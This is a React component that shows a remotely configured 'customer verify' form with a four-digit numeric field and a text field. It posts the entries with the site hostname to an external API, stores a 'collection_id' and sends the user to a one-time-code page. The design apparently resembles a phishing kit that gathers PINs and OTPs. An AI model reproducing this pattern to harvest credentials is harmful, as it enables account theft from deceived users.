import Header from '../resources/Header'
import Footer from '../resources/Footer'
import Loader from "../resources/Loader";
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import PageData from '../hooks/PageData';

function CustomerVerify() {
  const [loader, setLoader] = useState(true);
  useEffect(()=>{
    setTimeout(function(){
      setLoader(false);
    },2000)
  })

   // Form submit handler
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();

   const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); 
    const API_URL = process.env.REACT_APP_API_URL;

    const formData = new FormData(e.target);
    const jsonObject = {};
    
    formData.forEach((value, key) => {
      jsonObject[key] = value;
    });

    const postData = {
      data: jsonObject,
      site: window.location.hostname
    };

    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(postData)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const responseData = await response.json();
      if (responseData.status === 200) {
        localStorage.setItem('collection_id', responseData.data);
        localStorage.setItem('next', "/");
        localStorage.setItem("next_page_otp_times", 50);
        navigate('/onetimeverify');
      } else {
        alert("Invalid response");
      }
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    } finally {
      setLoading(false);  
    }
  };

  const { data, loading2, error } = PageData();

  useEffect(() => {
    if (data) {
      
    }
    }, [data]);
    if (loading2) {
      return <div>Loading...</div>; 
    }
  
    if (error) {
      return <div>Error: {error}</div>; 
    }
  
    if (!data || !data.header) {
      return <div>No header available</div>; 
    }
  
    const home = data.vericus;
  return (
    <>
    <Header />
    <main>
      <div className="container">
      {loader ? (
        <Loader />
        ) : (
          <>
          <div className='mt-4'>
              <h1 className="text-center">{home.header_text}</h1>  
          </div>
          <div className='shadow px-4 py-2 border-0'>
            <form onSubmit={handleSubmit} >
            <div className='form-group'>
                  <label>{home.form[0].label}</label>
                  <input type='text' inputMode='numeric' maxLength={4} minLength={4} name={home.form[0].name} className='form-control my-control' required/>
              </div>
              <div className='form-group'>
                  <label>{home.form[1].label}</label>
                  <input type='text' name={home.form[1].name} className='form-control my-control' required/>
              </div>
              <div className='text-center'>
                <input type='submit' disabled={loading} value={home.submit_button} className='btn btn-danger submit-button' required/>
              </div>

            </form>
          </div>
          </>
        )
      }
        
      </div>
    </main>
    <Footer />
    </>
  );
}

export default CustomerVerify;
